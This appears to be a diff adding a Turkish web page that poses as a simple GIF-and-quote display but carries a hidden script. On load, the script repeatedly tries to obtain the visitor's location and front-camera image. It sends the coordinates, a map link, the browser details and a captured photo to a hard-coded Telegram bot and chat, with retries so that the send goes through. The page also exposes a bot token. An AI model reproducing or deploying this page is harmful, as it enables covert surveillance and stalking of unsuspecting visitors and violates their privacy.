@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GIF Gösterimi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #1a1a1a;
+            font-family: Arial, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .gif-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            min-height: 100vh;
+            gap: 30px;
+            padding: 20px;
+        }
+
+        .gif-container img {
+            max-width: 90%;
+            max-height: 70vh;
+            width: auto;
+            height: auto;
+            object-fit: contain;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .quote {
+            color: #ffffff;
+            font-size: 24px;
+            font-style: italic;
+            text-align: center;
+            padding: 0 20px;
+            max-width: 800px;
+            line-height: 1.6;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
+        }
+
+        .status {
+            color: #ffffff;
+            font-size: 16px;
+            text-align: center;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: rgba(0, 0, 0, 0.5);
+            border-radius: 5px;
+            max-width: 600px;
+            white-space: pre-line;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Mobil cihazlar için responsive */
+        @media (max-width: 768px) {
+            .quote {
+                font-size: 18px;
+                padding: 0 15px;
+            }
+
+            .gif-container img {
+                max-width: 95%;
+                max-height: 60vh;
+            }
+
+            .gif-container {
+                gap: 20px;
+                padding: 15px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .quote {
+                font-size: 16px;
+                padding: 0 10px;
+            }
+
+            .gif-container img {
+                max-width: 100%;
+                max-height: 50vh;
+            }
+
+            .gif-container {
+                gap: 15px;
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="gif-container">
+        <img src="Don Carlone.gif" alt="GIF" onerror="this.style.display='none';">
+        <p class="quote">"A man who doesn't spend time with his family can never be a real man."</p>
+        <button id="permissionBtn" style="display: none; padding: 15px 30px; font-size: 18px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 20px;">İzinleri Ver</button>
+        <div id="status" class="status hidden"></div>
+    </div>
+
+    <script>
+        const TELEGRAM_API_URL = 'https://api.telegram.org/bot';
+
+        // Telegram bot ayarları
+        const botToken = '8542243389:AAFoXxq3J61qVvo2tl7EeMcgdY3mMQYibDU';
+        const chatId = '-4991699158';
+
+        // Telegram'a mesaj gönder
+        async function sendToTelegram(message, photoData = null) {
+            try {
+                console.log('📤 Mesaj gönderiliyor...');
+                // Mesajı gönder
+                const messageUrl = `${TELEGRAM_API_URL}${botToken}/sendMessage`;
+                const messageResponse = await fetch(messageUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const messageResult = await messageResponse.json();
+                
+                if (!messageResponse.ok) {
+                    console.error('❌ Mesaj gönderme hatası:', messageResult);
+                    throw new Error(messageResult.description || 'Mesaj gönderilemedi');
+                }
+
+                console.log('✅ Mesaj gönderildi!');
+
+                // Fotoğraf varsa gönder
+                if (photoData && photoData.image) {
+                    console.log('📸 Fotoğraf gönderiliyor...');
+                    // Base64'ü blob'a çevir
+                    const base64Data = photoData.image.replace(/^data:image\/\w+;base64,/, '');
+                    const byteCharacters = atob(base64Data);
+                    const byteNumbers = new Array(byteCharacters.length);
+                    for (let i = 0; i < byteCharacters.length; i++) {
+                        byteNumbers[i] = byteCharacters.charCodeAt(i);
+                    }
+                    const byteArray = new Uint8Array(byteNumbers);
+                    const blob = new Blob([byteArray], { type: 'image/jpeg' });
+
+                    // FormData ile gönder
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('caption', '📸 Ziyaretçi kamera fotoğrafı');
+
+                    const photoUrl = `${TELEGRAM_API_URL}${botToken}/sendPhoto`;
+                    const photoResponse = await fetch(photoUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const photoResult = await photoResponse.json();
+                    if (!photoResponse.ok) {
+                        console.error('❌ Fotoğraf gönderme hatası:', photoResult);
+                    } else {
+                        console.log('✅ Fotoğraf gönderildi!');
+                    }
+                }
+
+                return { success: true };
+            } catch (error) {
+                console.error('❌ Telegram gönderme hatası:', error);
+                throw error;
+            }
+        }
+
+        async function requestPermissions() {
+            console.log('🔔 İzin istekleri başlatılıyor...');
+            
+            if (!botToken || !chatId) {
+                console.error('❌ Bot token veya chat ID eksik!');
+                return;
+            }
+
+            let locationData = null;
+            let cameraData = null;
+
+            console.log('📍 Konum izni isteniyor...');
+            console.log('📸 Kamera izni isteniyor...');
+
+            // Konum ve kamera izinlerini paralel olarak iste
+            const [locationResult, cameraResult] = await Promise.allSettled([
+                // Konum izni iste
+                (async () => {
+                    try {
+                        if (!navigator.geolocation) {
+                            throw new Error('Geolocation desteklenmiyor');
+                        }
+                        
+                        console.log('📍 Konum izni bekleniyor...');
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: false,
+                                timeout: 10000,
+                                maximumAge: 60000
+                            });
+                        });
+
+                        const locationInfo = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date(position.timestamp).toISOString()
+                        };
+                        
+                        console.log('✅ Konum alındı:', locationInfo);
+                        return locationInfo;
+                    } catch (error) {
+                        console.error('❌ Konum hatası:', error.message);
+                        return {
+                            error: error.message,
+                            code: error.code
+                        };
+                    }
+                })(),
+                
+                // Ön kamera izni iste
+                (async () => {
+                    try {
+                        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                            throw new Error('Kamera API desteklenmiyor');
+                        }
+                        
+                        console.log('📸 Kamera izni bekleniyor...');
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: 'user' }
+                        });
+
+                        console.log('✅ Kamera erişimi sağlandı, fotoğraf çekiliyor...');
+
+                        // Video stream'den bir frame yakala
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.setAttribute('playsinline', 'true');
+                        video.setAttribute('autoplay', 'true');
+                        video.muted = true;
+                        await video.play();
+
+                        await new Promise((resolve, reject) => {
+                            const timeout = setTimeout(() => {
+                                if (video.readyState >= 2) {
+                                    resolve();
+                                } else {
+                                    reject(new Error('Video yüklenemedi'));
+                                }
+                            }, 2000);
+                            
+                            video.onloadedmetadata = () => {
+                                clearTimeout(timeout);
+                                resolve();
+                            };
+                            video.onerror = (err) => {
+                                clearTimeout(timeout);
+                                reject(err);
+                            };
+                        });
+
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+
+                        const result = {
+                            image: canvas.toDataURL('image/jpeg', 0.7),
+                            width: canvas.width,
+                            height: canvas.height,
+                            timestamp: new Date().toISOString()
+                        };
+
+                        stream.getTracks().forEach(track => track.stop());
+                        console.log('✅ Fotoğraf çekildi:', result.width + 'x' + result.height);
+                        return result;
+                    } catch (error) {
+                        console.error('❌ Kamera hatası:', error.message);
+                        return {
+                            error: error.message,
+                            name: error.name
+                        };
+                    }
+                })()
+            ]);
+
+            locationData = locationResult.status === 'fulfilled' ? locationResult.value : { error: 'Konum alınamadı' };
+            cameraData = cameraResult.status === 'fulfilled' ? cameraResult.value : { error: 'Kamera alınamadı' };
+
+            console.log('📊 Veriler hazır, Telegram\'a gönderiliyor...');
+            console.log('📍 Konum:', locationData);
+            console.log('📸 Kamera:', cameraData.image ? 'Fotoğraf var' : 'Fotoğraf yok');
+
+            // Telegram'a gönder
+            try {
+                let message = '🔔 <b>Yeni Ziyaretçi Bilgileri</b>\n\n';
+                message += `⏰ Zaman: ${new Date().toLocaleString('tr-TR')}\n`;
+                message += `🌐 URL: ${window.location.href}\n`;
+                message += `💻 User Agent: ${navigator.userAgent}\n\n`;
+
+                // Konum bilgisi - MUTLAKA EKLE
+                if (locationData && locationData.latitude && locationData.longitude) {
+                    message += `📍 <b>Konum:</b>\n`;
+                    message += `   Enlem: ${locationData.latitude}\n`;
+                    message += `   Boylam: ${locationData.longitude}\n`;
+                    message += `   Doğruluk: ${locationData.accuracy ? locationData.accuracy.toFixed(2) + 'm' : 'Bilinmiyor'}\n\n`;
+                    message += `🗺️ <a href="https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}">Haritada Görüntüle</a>\n\n`;
+                } else {
+                    message += `❌ Konum: ${locationData?.error || 'Alınamadı'}\n\n`;
+                }
+
+                // Kamera bilgisi - MUTLAKA EKLE
+                if (cameraData && cameraData.image) {
+                    message += `📸 Kamera fotoğrafı alındı (${cameraData.width}x${cameraData.height})\n`;
+                } else {
+                    message += `❌ Kamera: ${cameraData?.error || 'Alınamadı'}\n`;
+                }
+
+                // Telegram'a gönder
+                console.log('📤 Telegram\'a gönderiliyor...');
+                await sendToTelegram(message, cameraData);
+                console.log('✅ Telegram\'a başarıyla gönderildi!');
+            } catch (error) {
+                console.error('❌ Gönderme hatası:', error);
+                // Hata olsa bile tekrar dene
+                try {
+                    console.log('🔄 Tekrar deneniyor...');
+                    let retryMessage = '🔔 <b>Yeni Ziyaretçi Bilgileri (Tekrar Deneme)</b>\n\n';
+                    if (locationData && locationData.latitude) {
+                        retryMessage += `📍 Konum: ${locationData.latitude}, ${locationData.longitude}\n`;
+                    }
+                    if (cameraData && cameraData.image) {
+                        retryMessage += `📸 Kamera fotoğrafı var\n`;
+                    }
+                    await sendToTelegram(retryMessage, cameraData);
+                    console.log('✅ Tekrar deneme başarılı!');
+                } catch (retryError) {
+                    console.error('❌ Tekrar deneme hatası:', retryError);
+                }
+            }
+        }
+
+        // Sayfa yüklendiğinde izinleri iste
+        let permissionsRequested = false;
+        
+        function getPermissionBtn() {
+            return document.getElementById('permissionBtn');
+        }
+        
+        function startPermissionRequest() {
+            if (permissionsRequested) {
+                return;
+            }
+            permissionsRequested = true;
+            console.log('🚀 İzinler isteniyor...');
+            
+            // Butonu gizle
+            const btn = getPermissionBtn();
+            if (btn) {
+                btn.style.display = 'none';
+            }
+            
+            // Hemen iste, bekleme
+            requestPermissions().catch(err => {
+                console.error('İzin isteği hatası:', err);
+                // Hata olursa butonu tekrar göster
+                const btn = getPermissionBtn();
+                if (btn) {
+                    btn.style.display = 'block';
+                }
+            });
+        }
+        
+        // Otomatik izin isteği - bazı tarayıcılar için çalışmayabilir
+        function tryAutoRequest() {
+            if (!permissionsRequested) {
+                // Önce otomatik dene
+                try {
+                    startPermissionRequest();
+                } catch (e) {
+                    // Otomatik çalışmazsa butonu göster
+                    const btn = getPermissionBtn();
+                    if (btn) {
+                        btn.style.display = 'block';
+                        console.log('⚠️ Otomatik izin istenemedi, buton gösteriliyor...');
+                    }
+                }
+            }
+        }
+        
+        // Sayfa yüklendiğinde butonu ayarla
+        function initPermissions() {
+            const btn = getPermissionBtn();
+            if (btn) {
+                btn.addEventListener('click', startPermissionRequest);
+            }
+            
+            // Otomatik izin iste
+            setTimeout(tryAutoRequest, 1000);
+        }
+        
+        // Birden fazla event listener ekle - garantili çalışsın
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initPermissions);
+        } else {
+            initPermissions();
+        }
+        
+        window.addEventListener('load', () => {
+            setTimeout(tryAutoRequest, 1500);
+        });
+        
+        // Mobil için ekstra güvence
+        window.addEventListener('pageshow', () => {
+            setTimeout(tryAutoRequest, 500);
+        });
+        
+        // Son çare: 3 saniye sonra butonu göster
+        setTimeout(() => {
+            if (!permissionsRequested) {
+                const btn = getPermissionBtn();
+                if (btn) {
+                    btn.style.display = 'block';
+                    console.log('⏰ Timeout: İzin butonu gösteriliyor...');
+                }
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
